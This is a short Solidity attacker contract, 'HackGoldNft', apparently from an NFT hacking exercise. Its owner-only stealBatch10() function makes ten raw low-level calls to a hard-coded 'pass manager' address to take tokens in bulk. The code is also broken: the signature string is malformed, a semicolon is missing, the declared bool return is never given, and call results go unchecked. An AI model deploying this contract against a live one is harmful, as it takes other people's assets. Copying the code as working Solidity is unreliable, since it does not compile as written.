// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract HackGoldNft {

    address immutable I_PASS_MANAGER = 0xe43029d90B47Dd47611BAd91f24F87Bc9a03AEC2;
    address public owner;

    constructor(){
        owner = msg.sender;
    }

    modifier isOwner() {
        // msg.sender: predefined variable that represents address of the account that called the current function
        require(msg.sender == owner, "Not the Owner");
        _;
    }

    function stealBatch10() external isOwner returns(bool){
        for(uint i=0; i<10;){
            I_PASS_MANAGER.call(abi.encodeWithSignature("0x0daa5703(uint,uint", i, i))
            unchecked {
                i++;
            }
        }
    }
}